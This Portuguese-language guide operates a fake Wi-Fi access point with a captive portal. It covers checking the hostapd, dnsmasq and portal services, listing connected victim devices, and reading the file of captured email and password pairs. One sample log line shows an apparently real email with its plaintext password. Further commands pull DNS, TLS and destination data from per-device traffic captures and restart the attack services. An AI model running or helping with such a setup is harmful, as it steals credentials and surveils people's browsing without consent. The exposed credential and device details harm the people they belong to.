# GUIA DE USO - Fake AP + Captive Portal

## Sistema completo: Lucas_2GHz (Fake AP) + Captive Portal v2

---

## 1. VERIFICAR STATUS DO SISTEMA

```bash
# Ver todos os serviços rodando
ps aux | grep -E "(hostapd|dnsmasq|captive_portal|monitor_24h)" | grep -v grep

# Ver portas ativas
netstat -tlnp | grep -E ":(8080|53|67)"

# Ver regras de redirecionamento
iptables -t nat -L PREROUTING -v -n | grep buS1
iptables -L FORWARD -v -n | grep -E "buS1|zsf1"
```

---

## 2. VER DISPOSITIVOS CONECTADOS AO FAKE AP

```bash
# Dispositivos com IP via DHCP (logs históricos de conexão)
cat /var/lib/misc/dnsmasq.leases

# Dispositivos associados via Wi-Fi no MOMENTO (conectados agora)
iw dev buS1 station dump

# Tabela ARP (IP → MAC)
arp -i buS1 -n
```

**Exemplo de saída** (cada linha = 1 dispositivo):
```
1780267257 4c:e0:db:66:55:e2 192.168.50.51 M2006C3MG-Redmi9C 01:4c:e0:db:66:55:e2
```
- `1780267257` = timestamp UNIX da concessão do IP
- `4c:e0:db:66:55:e2` = MAC address
- `192.168.50.51` = IP
- `M2006C3MG-Redmi9C` = hostname (se disponível)

---

## 3. VER CREDENCIAIS CAPTURADAS

```bash
# TODAS as credenciais capturadas (email + senha)
cat /root/wifi/captures/credenciais/todas.txt

# Ver JSON de uma captura específica
cat /root/wifi/captures/credenciais/1780158224_192.168.50.12.json
```

**Formato do log:**
```
[2026-05-30 19:41:59] IP:192.168.50.51 | Provider:google | Email:ranlens.denck@armazem.cloud | Senha:gdgdjskwjw
```

---

## 4. LER ARQUIVOS .md (ANÁLISES PRONTAS)

Os arquivos `.md` são gerados automaticamente pelo `monitor_24h.sh` com base nos `.pcap`.

```bash
# Listar todas as análises disponíveis
ls -la /root/wifi/devices/

# Ler análise completa de um dispositivo
cat /root/wifi/devices/M2006C3MG-Redmi9C.md
cat /root/wifi/devices/device_16839148b5f1.md
cat /root/wifi/devices/rsdenck-dektop.md
```

**O que cada .md contém:**
| Seção | Descrição |
|---|---|
| DNS Queries | Sites que o dispositivo tentou acessar |
| SNI/TLS | Domínios em conexões HTTPS |
| IPs destino + geolocalização | País, cidade, operadora de cada IP |
| Volume de tráfego | Total de pacotes e bytes |
| Timeline | Início e fim da captura |
| Conexões TCP | IP:porta de cada conexão |

---

## 5. LER ARQUIVOS .pcap (ANÁLISE MANUAL COM TSHARK)

```bash
# Listar todos os .pcap disponíveis
ls -la /root/wifi/captures/dispositivos/*.pcap

# 5.1 VER DNS QUERIES do dispositivo
tshark -r dispositivo.pcap -Y "dns" -T fields -e dns.qry.name 2>/dev/null | sort -u

# 5.2 VER SITES (SNI/TLS) - domínios em conexões HTTPS
tshark -r dispositivo.pcap -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name 2>/dev/null | sort -u

# 5.3 VER IPs DE DESTINO mais acessados
tshark -r dispositivo.pcap -T fields -e ip.dst 2>/dev/null | sort | uniq -c | sort -rn

# 5.4 VER VOLUME DE TRÁFEGO
capinfos dispositivo.pcap

# 5.5 VER CONEXÕES TCP (origem → destino:porta)
tshark -r dispositivo.pcap -Y "tcp.flags.syn==1 and tcp.flags.ack==0" -T fields -e ip.src -e ip.dst -e tcp.dstport 2>/dev/null

# 5.6 VER TIMELINE (primeiro/último pacote)
capinfos -ae dispositivo.pcap

# 5.7 VER REQUISIÇÕES HTTP (se houver)
tshark -r dispositivo.pcap -Y "http.request" -T fields -e http.request.method -e http.request.uri -e http.host 2>/dev/null

# 5.8 EXTRAIR TODOS OS PACOTES em formato legível
tshark -r dispositivo.pcap -V 2>/dev/null | head -200
```

---

## 6. EXEMPLOS PRÁTICOS (COMANDOS REAIS)

```bash
cd /root/wifi/captures/dispositivos

# DNS do Redmi 9C
tshark -r M2006C3MG-Redmi9C_20260530_110554.pcap -Y "dns" -T fields -e dns.qry.name 2>/dev/null | sort -u

# Top IPs do device_16839148b5f1
tshark -r device_16839148b5f1_20260530_132236.pcap -T fields -e ip.dst 2>/dev/null | sort | uniq -c | sort -rn | head -10

# Volume de tráfego
capinfos M2006C3MG-Redmi9C_20260530_110554.pcap
```

---

## 7. MONITORAMENTO EM TEMPO REAL

```bash
# Log do monitor 24h (novos dispositivos detectados)
tail -f /root/wifi/var/logs/monitor_24h.log

# Captive portal log
tail -f /root/wifi/src/captive.log

# Últimas credenciais capturadas
tail -f /root/wifi/captures/credenciais/todas.txt

# Ver dispositivos no FAKE AP agora
watch -n 5 'echo "=== LEASES ===" && cat /var/lib/misc/dnsmasq.leases && echo "" && echo "=== STATIONS ===" && iw dev buS1 station dump | grep -E "Station|signal|connected|inactive"'
```

---

## 8. GERAR NOVA ANÁLISE MANUAL DE UM .pcap

```bash
# Analisar um pcap manualmente e salvar como .md
PCAP="caminho/do/arquivo.pcap"
NOME="nome_do_dispositivo"

cat > /root/wifi/devices/${NOME}.md << EOF
# Dispositivo: ${NOME}

## DNS Queries
\$(tshark -r "\$PCAP" -Y "dns" -T fields -e dns.qry.name 2>/dev/null | sort -u)

## Sites Visitados (SNI/TLS)
\$(tshark -r "\$PCAP" -Y "tls.handshake.extensions_server_name" -T fields -e tls.handshake.extensions_server_name 2>/dev/null | sort -u)

## Volume de Tráfego
\$(capinfos "\$PCAP")
EOF
```

---

## 9. REINICIAR SERVIÇOS (SE NECESSÁRIO)

```bash
# Reiniciar FAKE AP
pkill hostapd
hostapd -B /root/wifi/conf/hostapd/lucas_2ghz.conf

# Reiniciar DHCP/DNS
pkill dnsmasq
dnsmasq -C /root/wifi/conf/dnsmasq/lucas_2ghz.conf -i buS1 --bind-interfaces

# Reiniciar CAPTIVE PORTAL
screen -S captive -X quit
screen -dmS captive bash -c "cd /root/wifi/src && while true; do PYTHONUNBUFFERED=1 python3 captive_portal.py 2>&1 | tee -a /root/wifi/src/captive.log; sleep 1; done"

# Reiniciar MONITOR 24h
screen -S monitor_24h -X quit
screen -dmS monitor_24h /root/wifi/src/monitor_24h.sh
```

---

## 10. ACESSAR SCREENS (LOGS EM TEMPO REAL)

```bash
# Anexar ao captive portal (Ctrl+A+D para desanexar)
screen -r captive

# Anexar ao monitor 24h
screen -r monitor_24h

# Ver screens ativos
screen -ls
```